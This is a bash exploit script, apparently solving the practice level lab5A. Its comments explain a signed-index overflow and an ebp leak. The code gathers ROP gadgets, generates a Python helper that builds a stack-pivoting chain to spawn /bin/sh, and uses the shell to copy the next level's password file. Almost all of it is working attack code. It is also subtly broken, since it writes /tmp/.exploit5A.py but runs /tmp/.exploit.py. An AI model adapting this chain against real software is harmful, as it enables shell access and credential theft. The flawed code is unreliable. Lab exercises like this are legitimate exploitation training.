#!/bin/bash

###############################
##  Exploit for level lab5A  ##
###############################


#   Behaviour: This level implements the same functionality than lab3A.

#   Observations: This level now checks that the index isn't greater than
# the size of the array, canaries and DEP are enabled.

#   Exploitation: The goal of this level is to use ROP to successfuly exploit
# the program. We can take advantage of the vulnerability in store_number(),
# although it checks that the index isn't greater than 100, it is a signed
# comparison. This means that if we use 0xfffffff5 as the index, it will treat
# it as -11 and, therefore, will store the number at *(buffer-11). We can then
# overwrite the return address of store_number() and start executing our ROP
# chain.

# We can place our ROP chain inside the number array, but we will have to do
# stack pivoting in order to avoid the reserved indexes.


# In order to get the addresses of the gadgets, we will use ROPgadget tool
echo "[+] Collecting gadgets with ROPgadget, this could take a while..."
ROPgadget --binary /levels/lab05/lab5A > /tmp/.5A.gd

# I've found theese gadgets that combined seem to give me a shell. Let's try
# them out:

# - The first gadget will zero out ecx and eax registers:
#       xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret

# - This one will move the pointer to /bin/sh into ebx:
#       pop ebx ; pop edi ; ret

# - This gadget will zero out the edx register:
#       mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret

# - This one will help us with pivoting:
#       pop esi ; ret

# - The next one will set eax to 0xb (if we repeat it 0xb times):
#       nop ; inc eax ; ret

# - This gadget will make the syscall:
#       int 0x80

# - And finally, we will use this gadget to pivot where the rest of the ROP
#   chain is located:
#       xor eax, eax ; add esp, 0x20 ; pop ebx ; pop esi ; pop edi ; ret

g1=$(cat /tmp/.5A.gd | grep ": xor ecx, ecx ; pop" | cut -d" " -f1)
g2=$(cat /tmp/.5A.gd | grep ": pop ebx ; pop edi" | cut -d" " -f1)
g3=$(cat /tmp/.5A.gd | grep ": mov edx, ecx" | cut -d" " -f1)
g4=$(cat /tmp/.5A.gd | grep ": pop esi ; ret" | cut -d" " -f1)
g5=$(cat /tmp/.5A.gd | grep ": nop ; inc eax" | cut -d" " -f1)
g6=$(cat /tmp/.5A.gd | grep ": int 0x80" | cut -d" " -f1)
g7=$(cat /tmp/.5A.gd | grep ": xor eax, eax ; add esp, 0x20" | cut -d" " -f1)
echo "[+] Gadgets collected!"
echo "    g1 -> $(cat /tmp/.5A.gd | grep "$g1")"
echo "    g2 -> $(cat /tmp/.5A.gd | grep "$g2")"
echo "    g3 -> $(cat /tmp/.5A.gd | grep "$g3")"
echo "    g4 -> $(cat /tmp/.5A.gd | grep "$g4")"
echo "    g5 -> $(cat /tmp/.5A.gd | grep "$g5")"
echo "    g6 -> $(cat /tmp/.5A.gd | grep "$g6")"
echo "    g7 -> $(cat /tmp/.5A.gd | grep "$g7")"

# To determine with precision target addresses, we can exploit another vulnerability
# of the program. In read_number() there is no control whatsoever of the index, this
# means that we can use the same technique as for store_number() to read the main()'s
# ebp value (stored at esp-0x8 or index -12) when the function is called.

echo "[+] Looking for main()'s ebp value..."
ebp=$(python -c 'print "read\n-12\nquit\n"' | /levels/lab05/lab5A | grep -oP "[1-9]{3,}")
echo "[+] Value for ebp found: $ebp"

# Since ASLR is off, we can use this value of ebp to compute any target address with
# precission (so no need for NOP sleds)

# Now we need to build the ROP chain in the stack. We will write a python
# script to do so.
cat > /tmp/.exploit5A.py <<EOF
import sys


g1 = int(sys.argv[1], 16)
g2 = int(sys.argv[2], 16)
g3 = int(sys.argv[3], 16)
g4 = int(sys.argv[4], 16)
g5 = int(sys.argv[5], 16)
g6 = int(sys.argv[6], 16)
g7 = int(sys.argv[7], 16)
ebp = int(sys.argv[8])  # main()'s base pointer

# Since the command buffer is at [esp+0x1b8] we can compute the address
# of the command buffer with:
sh = ((ebp - 0xc) & 0xfffffff0) - 0x1d0 + 0x1b8
sh += 5  # +5 to skip "store"

# Now we will set up the ROP chain adjusting the gadgets with the gaps
# of the buffer ('None' elements will be ignored):
rop = [
    g5,  # Use this gadget as a NOP (doesn't affect ESP)
    g1,
    None,
    None,
    None,
    None,
    g2,
    sh,
    None,
    g3,
    None,
    None,
    None,
    g4,
    None,
    (0xb, [g5, g4, None]),
    g6
    ]

i = 1  # We will pivot from [esp] to [esp+2c] (or index 1 of the array)


def ROP(rop):
    '''
    This function will build a ROP chain:
        -Chain in list form
        -None type elements will be ignored
    
    We  will iterate through every element in the list, crafting
    the command string to propertly store the gadget in the stack,
    skipping the indexes for None elements.
    '''
    global i
    buf = ''
    for x in rop:
        if type(x) is tuple:  # This will make easier to repeat group of gadgets
            for j in xrange(x[0]):
                buf += ROP(x[1])
            continue
        elif x is not None:
            buf += 'store\n%d\n%d\n' % (x, i)
        i += 1 
    return buf


buf = ROP(rop)

# Now we have to change the return address of store_number()
# with the gadget that will do the pivoting to the rest of the ROP chain
buf += 'store/bin/sh\n%d\n-11' % g7
print buf
EOF

# Seems that we are ready to exploit!
passfile="/tmp/lab5end.pass"
(python /tmp/.exploit.py $g1 $g2 $g3 $g4 $g5 $g6 $g7 $ebp; 
    echo "cat /home/lab5end/.pass > $passfile";) | /levels/lab05/lab5A

echo
echo "[+] Password saved in $passfile"
echo "[+] Cleaning-up..."
rm -f /tmp/.exploit5A.py /tmp/.5A.gd
